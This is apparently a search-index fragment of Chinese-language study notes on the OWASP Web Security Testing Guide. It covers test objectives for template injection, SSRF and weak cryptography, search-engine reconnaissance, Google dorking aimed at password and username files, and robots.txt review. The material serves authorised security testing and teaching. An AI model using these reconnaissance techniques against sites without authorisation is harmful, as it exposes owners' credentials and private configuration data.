<p>4.7.18\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u68c0\u6d4b\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\u70b9\u3002 \u8bc6\u522b\u6a21\u677f\u5f15\u64ce\u3002 \u6784\u5efa\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f\u3002</p> <p>4.7.19\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b SSRF \u6ce8\u5165\u70b9\u3002 \u6d4b\u8bd5\u6ce8\u5165\u70b9\u662f\u5426\u53ef\u5229\u7528\u3002 \u8bc4\u4f30\u6f0f\u6d1e\u7684\u4e25\u91cd\u6027\u3002</p> <p>4.7.20\u6279\u91cf\u5206\u914d\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u4fee\u6539\u5bf9\u8c61\u7684\u8bf7\u6c42 \u8bc4\u4f30\u662f\u5426\u53ef\u4ee5\u4fee\u6539\u4ece\u672a\u6253\u7b97\u4ece\u5916\u90e8\u4fee\u6539\u7684\u5b57\u6bb5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/8%E3%80%81%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E6%B5%8B%E8%AF%95/","title":"8\u3001\u9519\u8bef\u5904\u7406\u6d4b\u8bd5","text":"<p>\u9519\u8bef\u5904\u7406\u4e0d\u5f53\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u73b0\u6709\u7684\u9519\u8bef\u8f93\u51fa\u3002 \u5206\u6790\u8fd4\u56de\u7684\u4e0d\u540c\u8f93\u51fa\u3002</p> <p>4.8.2\u5806\u6808\u8ddf\u8e2a\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/9%E3%80%81%E5%BC%B1%E5%AF%86%E7%A0%81%E6%B5%8B%E8%AF%95/","title":"9\u3001\u5f31\u5bc6\u7801\u6d4b\u8bd5","text":"<p>\u5f31\u4f20\u8f93\u5c42\u5b89\u5168\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u9a8c\u8bc1\u670d\u52a1\u914d\u7f6e\u3002 \u68c0\u67e5\u6570\u5b57\u8bc1\u4e66\u7684\u52a0\u5bc6\u5f3a\u5ea6\u548c\u6709\u6548\u6027\u3002 \u786e\u4fdd TLS \u5b89\u5168\u6027\u4e0d\u53ef\u7ed5\u8fc7\u5e76\u4e14\u5728\u6574\u4e2a\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6b63\u786e\u5b9e\u65bd</p> <p>4.9.2\u00a0Padding Oracle\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u4f9d\u8d56\u4e8e\u586b\u5145\u7684\u52a0\u5bc6\u6d88\u606f\u3002 \u5c1d\u8bd5\u7834\u574f\u52a0\u5bc6\u6d88\u606f\u7684\u586b\u5145\u5e76\u5206\u6790\u8fd4\u56de\u7684\u9519\u8bef\u6d88\u606f\u4ee5\u8fdb\u884c\u8fdb\u4e00\u6b65\u5206\u6790\u3002</p> <p>4.9.3\u6d4b\u8bd5\u901a\u8fc7\u672a\u52a0\u5bc6\u901a\u9053\u53d1\u9001\u7684\u654f\u611f\u4fe1\u606f</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u901a\u8fc7\u5404\u79cd\u6e20\u9053\u4f20\u8f93\u7684\u654f\u611f\u4fe1\u606f\u3002 \u8bc4\u4f30\u6240\u4f7f\u7528\u6e20\u9053\u7684\u9690\u79c1\u548c\u5b89\u5168\u6027</p> <p>4.9.4\u5f31\u52a0\u5bc6\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u63d0\u4f9b\u8bc6\u522b\u5f31\u52a0\u5bc6\u6216\u6563\u5217\u4f7f\u7528\u548c\u5b9e\u73b0\u7684\u6307\u5357\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_2","title":"\u5229\u7528\u641c\u7d22\u5f15\u64ce\u4f5c\u4fe1\u606f\u6536\u96c6","text":"<p>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_3","title":"\u6982\u62ec","text":"<p>\u4e3a\u4e86\u8ba9\u641c\u7d22\u5f15\u64ce\u5de5\u4f5c\uff0c\u8ba1\u7b97\u673a\u7a0b\u5e8f\uff08\u6216\uff09\u5b9a\u671f\u4ece\u7f51\u7edc\u4e0a\u7684\u6570\u5341\u4ebf\u9875\u9762\u4e2d<code>robots</code>\u83b7\u53d6\u6570\u636e\uff08\u79f0\u4e3a\u722c\u884c\uff09\u3002\u8fd9\u4e9b\u7a0b\u5e8f\u901a\u8fc7\u8ddf\u8e2a\u5176\u4ed6\u9875\u9762\u7684\u94fe\u63a5\u6216\u67e5\u770b\u7ad9\u70b9\u5730\u56fe\u6765\u67e5\u627e Web \u5185\u5bb9\u548c\u529f\u80fd\u3002\u5982\u679c\u4e00\u4e2a\u7f51\u7ad9\u4f7f\u7528\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6<code>robots.txt</code>\u6765\u5217\u51fa\u5b83\u4e0d\u5e0c\u671b\u641c\u7d22\u5f15\u64ce\u83b7\u53d6\u7684\u9875\u9762\uff0c\u90a3\u4e48\u5217\u51fa\u7684\u9875\u9762\u5c06\u88ab\u5ffd\u7565\u3002\u8fd9\u662f\u4e00\u4e2a\u57fa\u672c\u6982\u8ff0 - Google \u5bf9\u641c\u7d22\u5f15\u64ce\u7684\u5de5\u4f5c\u539f\u7406\u63d0\u4f9b\u4e86\u66f4\u6df1\u5165\u7684\u89e3\u91ca\u3002</p> <p>\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u5bf9\u7f51\u7ad9\u548c Web \u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u4fa6\u5bdf\u3002\u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u548c\u4fa6\u5bdf\u6709\u76f4\u63a5\u548c\u95f4\u63a5\u7684\u8981\u7d20\uff1a\u76f4\u63a5\u65b9\u6cd5\u6d89\u53ca\u4ece\u7f13\u5b58\u4e2d\u641c\u7d22\u7d22\u5f15\u548c\u76f8\u5173\u5185\u5bb9\uff0c\u800c\u95f4\u63a5\u65b9\u6cd5\u6d89\u53ca\u901a\u8fc7\u641c\u7d22\u8bba\u575b\u3001\u65b0\u95fb\u7ec4\u548c\u62db\u6807\u7f51\u7ad9\u6765\u5b66\u4e60\u654f\u611f\u7684\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u3002</p> <p>\u4e00\u65e6\u641c\u7d22\u5f15\u64ce\u673a\u5668\u4eba\u5b8c\u6210\u722c\u884c\uff0c\u5b83\u5c31\u4f1a\u5f00\u59cb\u6839\u636e\u6807\u7b7e\u548c\u76f8\u5173\u5c5e\u6027\uff08\u4f8b\u5982 \uff09\u5bf9\u7f51\u9875\u5185\u5bb9\u7f16\u5236\u7d22\u5f15<code>&lt;TITLE&gt;</code>\uff0c\u4ee5\u4fbf\u8fd4\u56de\u76f8\u5173\u7684\u641c\u7d22\u7ed3\u679c\u3002\u5982\u679c<code>robots.txt</code>\u6587\u4ef6\u5728\u7f51\u7ad9\u7684\u751f\u547d\u5468\u671f\u5185\u6ca1\u6709\u66f4\u65b0\uff0c\u5e76\u4e14\u6ca1\u6709\u4f7f\u7528\u6307\u793a\u673a\u5668\u4eba\u4e0d\u7d22\u5f15\u5185\u5bb9\u7684\u5185\u8054 HTML \u5143\u6807\u8bb0\uff0c\u90a3\u4e48\u7d22\u5f15\u53ef\u80fd\u5305\u542b\u7f51\u7ad9\u4e0d\u6253\u7b97\u5305\u542b\u7684\u5185\u5bb9\u62e5\u6709\u8005\u3002\u7f51\u7ad9\u6240\u6709\u8005\u53ef\u4ee5\u4f7f\u7528\u524d\u9762\u63d0\u5230<code>robots.txt</code>\u7684 HTML \u5143\u6807\u8bb0\u3001\u8eab\u4efd\u9a8c\u8bc1\u548c\u641c\u7d22\u5f15\u64ce\u63d0\u4f9b\u7684\u5de5\u5177\u6765\u5220\u9664\u6b64\u7c7b\u5185\u5bb9\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_4","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u3001\u7cfb\u7edf\u6216\u7ec4\u7ec7\u7684\u54ea\u4e9b\u654f\u611f\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u76f4\u63a5\uff08\u5728\u7ec4\u7ec7\u7684\u7f51\u7ad9\u4e0a\uff09\u6216\u95f4\u63a5\uff08\u901a\u8fc7\u7b2c\u4e09\u65b9\u670d\u52a1\uff09\u516c\u5f00\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_5","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u53ef\u80fd\u654f\u611f\u7684\u4fe1\u606f\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\uff1a</p> <ul> <li>\u7f51\u7edc\u56fe\u548c\u914d\u7f6e\uff1b</li> <li>\u7ba1\u7406\u5458\u6216\u5176\u4ed6\u4e3b\u8981\u5458\u5de5\u7684\u5b58\u6863\u5e16\u5b50\u548c\u7535\u5b50\u90ae\u4ef6\uff1b</li> <li>\u767b\u5f55\u7a0b\u5e8f\u548c\u7528\u6237\u540d\u683c\u5f0f\uff1b</li> <li>\u7528\u6237\u540d\u3001\u5bc6\u7801\u548c\u79c1\u94a5\uff1b</li> <li>\u7b2c\u4e09\u65b9\u6216\u4e91\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\uff1b</li> <li>\u663e\u793a\u9519\u8bef\u4fe1\u606f\u5185\u5bb9\uff1b\u548c</li> <li>\u975e\u516c\u5171\u5e94\u7528\u7a0b\u5e8f\uff08\u5f00\u53d1\u3001\u6d4b\u8bd5\u3001\u7528\u6237\u9a8c\u6536\u6d4b\u8bd5 (UAT) \u548c\u7ad9\u70b9\u7684\u6682\u5b58\u7248\u672c\uff09\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_6","title":"\u641c\u7d22\u5f15\u64ce","text":"<p>\u4e0d\u8981\u5c06\u6d4b\u8bd5\u4ec5\u9650\u4e8e\u4e00\u4e2a\u641c\u7d22\u5f15\u64ce\u63d0\u4f9b\u5546\uff0c\u56e0\u4e3a\u4e0d\u540c\u7684\u641c\u7d22\u5f15\u64ce\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u7ed3\u679c\u3002\u641c\u7d22\u5f15\u64ce\u7ed3\u679c\u53ef\u80fd\u4f1a\u5728\u51e0\u4e2a\u65b9\u9762\u6709\u6240\u4e0d\u540c\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u5f15\u64ce\u4e0a\u6b21\u6293\u53d6\u5185\u5bb9\u7684\u65f6\u95f4\uff0c\u4ee5\u53ca\u5f15\u64ce\u7528\u6765\u786e\u5b9a\u76f8\u5173\u9875\u9762\u7684\u7b97\u6cd5\u3002\u8003\u8651\u4f7f\u7528\u4ee5\u4e0b\uff08\u6309\u5b57\u6bcd\u987a\u5e8f\u5217\u51fa\u7684\uff09\u641c\u7d22\u5f15\u64ce\uff1a</p> <ul> <li>\u767e\u5ea6\uff0c\u4e2d\u56fd\u6700\u53d7\u6b22\u8fce\u7684\u641c\u7d22\u5f15\u64ce\u3002</li> <li>Bing\u662f\u5fae\u8f6f\u62e5\u6709\u548c\u8fd0\u8425\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u5168\u7403\u7b2c\u4e8c\u53d7\u6b22\u8fce\u3002\u652f\u6301\u9ad8\u7ea7\u641c\u7d22\u5173\u952e\u5b57\u3002</li> <li>binsearch.info\uff0c\u4e8c\u8fdb\u5236 Usenet \u65b0\u95fb\u7ec4\u7684\u641c\u7d22\u5f15\u64ce\u3002</li> <li>Common Crawl\uff0c\u201c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8bbf\u95ee\u548c\u5206\u6790\u7684\u7f51\u7edc\u722c\u866b\u6570\u636e\u7684\u5f00\u653e\u5b58\u50a8\u5e93\u3002\u201d</li> <li>DuckDuckGo\u662f\u4e00\u4e2a\u4ee5\u9690\u79c1\u4e3a\u4e2d\u5fc3\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u53ef\u4ee5\u4ece\u8bb8\u591a\u4e0d\u540c\u7684\u6765\u6e90\u7f16\u8bd1\u7ed3\u679c\u3002\u652f\u6301\u641c\u7d22\u8bed\u6cd5\u3002</li> <li>Google\u63d0\u4f9b\u4e16\u754c\u4e0a\u6700\u53d7\u6b22\u8fce\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u5e76\u4f7f\u7528\u6392\u540d\u7cfb\u7edf\u5c1d\u8bd5\u8fd4\u56de\u6700\u76f8\u5173\u7684\u7ed3\u679c\u3002\u652f\u6301\u641c\u7d22\u8fd0\u7b97\u7b26\u3002</li> <li>Internet Archive Wayback Machine\uff0c\u201c\u4ee5\u6570\u5b57\u5f62\u5f0f\u6784\u5efa\u4e92\u8054\u7f51\u7ad9\u70b9\u548c\u5176\u4ed6\u6587\u5316\u5236\u54c1\u7684\u6570\u5b57\u56fe\u4e66\u9986\u3002\u201d</li> <li>Shodan\uff0c\u4e00\u79cd\u7528\u4e8e\u641c\u7d22\u8054\u7f51\u8bbe\u5907\u548c\u670d\u52a1\u7684\u670d\u52a1\u3002\u4f7f\u7528\u9009\u9879\u5305\u62ec\u6709\u9650\u7684\u514d\u8d39\u8ba1\u5212\u4ee5\u53ca\u4ed8\u8d39\u8ba2\u9605\u8ba1\u5212\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_7","title":"\u641c\u7d22\u8fd0\u7b97\u7b26","text":"<p>\u641c\u7d22\u8fd0\u7b97\u7b26\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5173\u952e\u5b57\u6216\u8bed\u6cd5\uff0c\u53ef\u6269\u5c55\u5e38\u89c4\u641c\u7d22\u67e5\u8be2\u7684\u529f\u80fd\uff0c\u5e76\u6709\u52a9\u4e8e\u83b7\u5f97\u66f4\u5177\u4f53\u7684\u7ed3\u679c\u3002\u5b83\u4eec\u901a\u5e38\u91c7\u7528<code>operator:query</code>.\u00a0\u4ee5\u4e0b\u662f\u4e00\u4e9b\u901a\u5e38\u652f\u6301\u7684\u641c\u7d22\u8fd0\u7b97\u7b26\uff1a</p> <ul> <li><code>site:</code>\u5c06\u641c\u7d22\u9650\u5236\u5728\u63d0\u4f9b\u7684\u57df\u4e2d\u3002</li> <li><code>inurl:</code>\u5c06\u53ea\u8fd4\u56de\u5728 URL \u4e2d\u5305\u542b\u5173\u952e\u5b57\u7684\u7ed3\u679c\u3002</li> <li><code>intitle:</code>\u53ea\u4f1a\u8fd4\u56de\u9875\u9762\u6807\u9898\u4e2d\u5305\u542b\u5173\u952e\u5b57\u7684\u7ed3\u679c\u3002</li> <li><code>intext:</code>\u6216\u8005<code>inbody:</code>\u53ea\u4f1a\u5728\u9875\u9762\u6b63\u6587\u4e2d\u641c\u7d22\u5173\u952e\u5b57\u3002</li> <li><code>filetype:</code>\u5c06\u4ec5\u5339\u914d\u7279\u5b9a\u6587\u4ef6\u7c7b\u578b\uff0c\u5373<code>.png</code>, \u6216<code>.php</code>.</li> </ul> <p>\u4f8b\u5982\uff0c\u8981\u67e5\u627e\u7531\u5178\u578b\u641c\u7d22\u5f15\u64ce\u7d22\u5f15\u7684 owasp.org \u7684 Web \u5185\u5bb9\uff0c\u6240\u9700\u8bed\u6cd5\u4e3a\uff1a</p> <pre><code>site:owasp.org\n</code></pre> <p> \u56fe 4.1.1-1\uff1aGoogle \u7ad9\u70b9\u64cd\u4f5c\u641c\u7d22\u7ed3\u679c\u793a\u4f8b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_8","title":"\u67e5\u770b\u7f13\u5b58\u5185\u5bb9","text":"<p>\u8981\u641c\u7d22\u4ee5\u524d\u5df2\u7f16\u5165\u7d22\u5f15\u7684\u5185\u5bb9\uff0c\u8bf7\u4f7f\u7528<code>cache:</code>\u8fd0\u7b97\u7b26\u3002\u8fd9\u6709\u52a9\u4e8e\u67e5\u770b\u81ea\u7d22\u5f15\u4ee5\u6765\u53ef\u80fd\u5df2\u66f4\u6539\u7684\u5185\u5bb9\uff0c\u6216\u8005\u53ef\u80fd\u4e0d\u518d\u53ef\u7528\u7684\u5185\u5bb9\u3002\u5e76\u975e\u6240\u6709\u641c\u7d22\u5f15\u64ce\u90fd\u63d0\u4f9b\u7f13\u5b58\u5185\u5bb9\u8fdb\u884c\u641c\u7d22\uff1b\u5728\u64b0\u5199\u672c\u6587\u65f6\u6700\u6709\u7528\u7684\u6765\u6e90\u662f\u8c37\u6b4c\u3002</p> <p>\u8981<code>owasp.org</code>\u5728\u7f13\u5b58\u65f6\u67e5\u770b\uff0c\u8bed\u6cd5\u4e3a\uff1a</p> <pre><code>cache:owasp.org\n</code></pre> <p> \u56fe 4.1.1-2\uff1a\u8c37\u6b4c\u7f13\u5b58\u64cd\u4f5c\u641c\u7d22\u7ed3\u679c\u793a\u4f8b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dorking","title":"\u8c37\u6b4c\u9ed1\u5ba2\uff0c\u6216 Dorking","text":"<p>\u5f53\u4e0e\u6d4b\u8bd5\u4eba\u5458\u7684\u521b\u9020\u529b\u76f8\u7ed3\u5408\u65f6\uff0c\u4f7f\u7528\u8fd0\u7b97\u7b26\u8fdb\u884c\u641c\u7d22\u53ef\u80fd\u662f\u4e00\u79cd\u975e\u5e38\u6709\u6548\u7684\u53d1\u73b0\u6280\u672f\u3002\u53ef\u4ee5\u94fe\u63a5\u8fd0\u7b97\u7b26\u4ee5\u6709\u6548\u5730\u53d1\u73b0\u7279\u5b9a\u79cd\u7c7b\u7684\u654f\u611f\u6587\u4ef6\u548c\u4fe1\u606f\u3002\u8fd9\u79cd\u79f0\u4e3aGoogle hacking\u6216 Dorking \u7684\u6280\u672f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u641c\u7d22\u5f15\u64ce\uff0c\u53ea\u8981\u652f\u6301\u641c\u7d22\u8fd0\u7b97\u7b26\u3002</p> <p>\u8bf8\u5982Google Hacking Database\u4e4b\u7c7b\u7684 dorks \u6570\u636e\u5e93\u662f\u4e00\u79cd\u6709\u7528\u7684\u8d44\u6e90\uff0c\u53ef\u4ee5\u5e2e\u52a9\u53d1\u73b0\u7279\u5b9a\u4fe1\u606f\u3002\u8be5\u6570\u636e\u5e93\u4e2d\u53ef\u7528\u7684\u4e00\u4e9b\u7c7b\u522b\u7684 dorks \u5305\u62ec\uff1a</p> <ul> <li>\u7acb\u8db3\u70b9</li> <li>\u5305\u542b\u7528\u6237\u540d\u7684\u6587\u4ef6</li> <li>\u654f\u611f\u76ee\u5f55</li> <li>Web \u670d\u52a1\u5668\u68c0\u6d4b</li> <li>\u6613\u53d7\u653b\u51fb\u7684\u6587\u4ef6</li> <li>\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668</li> <li>\u9519\u8bef\u4fe1\u606f</li> <li>\u5305\u542b\u591a\u6c41\u4fe1\u606f\u7684\u6587\u4ef6</li> <li>\u5305\u542b\u5bc6\u7801\u7684\u6587\u4ef6</li> <li>\u654f\u611f\u7684\u5728\u7ebf\u8d2d\u7269\u4fe1\u606f</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_9","title":"\u6574\u6cbb","text":"<p>\u5728\u5c06\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u53d1\u5e03\u5230\u7f51\u4e0a\u4e4b\u524d\uff0c\u8bf7\u4ed4\u7ec6\u8003\u8651\u5176\u654f\u611f\u6027\u3002</p> <p>\u5b9a\u671f\u5ba1\u67e5\u5728\u7ebf\u53d1\u5e03\u7684\u73b0\u6709\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u7684\u654f\u611f\u6027\u3002 https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#web-meta","title":"\u67e5\u770bWeb meta \u6587\u4ef6\u6709\u65e0\u654f\u611f\u4fe1\u606f","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_10","title":"\u6982\u62ec","text":"<p>\u672c\u8282\u4ecb\u7ecd\u5982\u4f55\u6d4b\u8bd5\u5404\u79cd\u5143\u6570\u636e\u6587\u4ef6\u662f\u5426\u5b58\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u8def\u5f84\u6216\u529f\u80fd\u7684\u4fe1\u606f\u6cc4\u6f0f\u3002\u6b64\u5916\uff0c\u8718\u86db\u3001\u673a\u5668\u4eba\u6216\u722c\u866b\u8981\u907f\u514d\u7684\u76ee\u5f55\u5217\u8868\u4e5f\u53ef\u4ee5\u521b\u5efa\u4e3a\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u6620\u5c04\u6267\u884c\u8def\u5f84\u7684\u4f9d\u8d56\u9879\u3002\u8fd8\u53ef\u4ee5\u6536\u96c6\u5176\u4ed6\u4fe1\u606f\u4ee5\u8bc6\u522b\u653b\u51fb\u9762\u3001\u6280\u672f\u7ec6\u8282\u6216\u7528\u4e8e\u793e\u4f1a\u5de5\u7a0b\u53c2\u4e0e\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_11","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u901a\u8fc7\u5206\u6790\u5143\u6570\u636e\u6587\u4ef6\u8bc6\u522b\u9690\u85cf\u6216\u6df7\u6dc6\u7684\u8def\u5f84\u548c\u529f\u80fd\u3002</li> <li>\u63d0\u53d6\u5e76\u6620\u5c04\u53ef\u80fd\u5bfc\u81f4\u66f4\u597d\u5730\u4e86\u89e3\u624b\u5934\u7cfb\u7edf\u7684\u5176\u4ed6\u4fe1\u606f\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_12","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u4e0b\u9762\u7528 \u6267\u884c\u7684\u4efb\u4f55\u64cd\u4f5c<code>wget</code>\u4e5f\u53ef\u4ee5\u7528 \u5b8c\u6210<code>curl</code>\u3002\u8bb8\u591a\u52a8\u6001\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5 (DAST) \u5de5\u5177\uff08\u4f8b\u5982 ZAP \u548c Burp Suite\uff09\u90fd\u5305\u542b\u5bf9\u8fd9\u4e9b\u8d44\u6e90\u7684\u68c0\u67e5\u6216\u89e3\u6790\uff0c\u4f5c\u4e3a\u5176\u8718\u86db/\u722c\u866b\u529f\u80fd\u7684\u4e00\u90e8\u5206\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5404\u79cdGoogle Dorks\u6216\u5229\u7528\u8bf8\u5982<code>inurl:</code>.</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_13","title":"\u673a\u5668\u4eba","text":"<p>Web Spiders\u3001Robots \u6216 Crawlers \u68c0\u7d22\u7f51\u9875\uff0c\u7136\u540e\u9012\u5f52\u904d\u5386\u8d85\u94fe\u63a5\u4ee5\u68c0\u7d22\u66f4\u591a\u7684 Web \u5185\u5bb9\u3002\u5b83\u4eec\u53ef\u63a5\u53d7\u7684\u884c\u4e3a\u7531Web \u6839\u76ee\u5f55\u4e2d\u7684robots.txt\u6587\u4ef6\u7684\u673a\u5668\u4eba\u6392\u9664\u534f\u8bae\u6307\u5b9a\u3002</p> <p>\u4f8b\u5982\uff0c\u4e0b\u9762\u5f15\u7528\u4e86 2020 \u5e74 5 \u6708 5 \u65e5\u4eceGoogle<code>robots.txt</code>\u91c7\u6837\u7684\u6587\u4ef6\u7684\u5f00\u5934\uff1a</p> <pre><code>User-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\nDisallow: /sdch\n...\n</code></pre> <p>User-Agent\u6307\u4ee4\u662f\u6307\u7279\u5b9a\u7684\u7f51\u7edc\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u3002\u4f8b\u5982\uff0c<code>User-Agent: Googlebot</code>\u6307\u7684\u662f\u6765\u81ea\u8c37\u6b4c\u7684\u8718\u86db\uff0c\u800c<code>User-Agent: bingbot</code>\u6307\u7684\u662f\u6765\u81ea\u5fae\u8f6f\u7684\u722c\u866b\u3002<code>User-Agent: *</code>\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u9002\u7528\u4e8e\u6240\u6709\u7f51\u7edc\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u3002</p> <p>\u8be5<code>Disallow</code>\u6307\u4ee4\u6307\u5b9a\u54ea\u4e9b\u8d44\u6e90\u88ab\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u7981\u6b62\u3002\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u7981\u6b62\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <pre><code>...\nDisallow: /search\n...\nDisallow: /sdch\n...\n</code></pre> <p>\u7f51\u7edc\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u53ef\u4ee5\u6545\u610f\u5ffd\u7565<code>Disallow</code>\u6587\u4ef6\u4e2d\u6307\u5b9a\u7684\u6307\u4ee4<code>robots.txt</code>\u3002\u56e0\u6b64\uff0c<code>robots.txt</code>\u4e0d\u5e94\u5c06\u5176\u89c6\u4e3a\u5bf9\u7b2c\u4e09\u65b9\u8bbf\u95ee\u3001\u5b58\u50a8\u6216\u91cd\u65b0\u53d1\u5e03 Web \u5185\u5bb9\u7684\u65b9\u5f0f\u5b9e\u65bd\u9650\u5236\u7684\u673a\u5236\u3002</p> <p>\u8be5<code>robots.txt</code>\u6587\u4ef6\u662f\u4ece Web \u670d\u52a1\u5668\u7684 Web \u6839\u76ee\u5f55\u4e2d\u68c0\u7d22\u7684\u3002\u4f8b\u5982\uff0c\u8981\u4f7f\u7528or\u68c0\u7d22<code>robots.txt</code>from\u00a0\uff1a<code>www.google.com``wget``curl</code></p> <pre><code>$ curl -O -Ss http://www.google.com/robots.txt &amp;&amp; head -n5 robots.txt\nUser-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\n...\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#google-robotstxt","title":"\u4f7f\u7528 Google \u7f51\u7ad9\u7ad9\u957f\u5de5\u5177\u5206\u6790 robots.txt","text":"<p>\u7f51\u7ad9\u6240\u6709\u8005\u53ef\u4ee5\u4f7f\u7528 Google \u7684\u201cAnalyze robots.txt\u201d\u529f\u80fd\u6765\u5206\u6790\u7f51\u7ad9\uff0c\u4f5c\u4e3a\u5176Google \u7f51\u7ad9\u7ba1\u7406\u5458\u5de5\u5177\u7684\u4e00\u90e8\u5206\u3002\u8be5\u5de5\u5177\u53ef\u4ee5\u8f85\u52a9\u6d4b\u8bd5\uff0c\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>\u4f7f\u7528 Google \u5e10\u6237\u767b\u5f55 Google 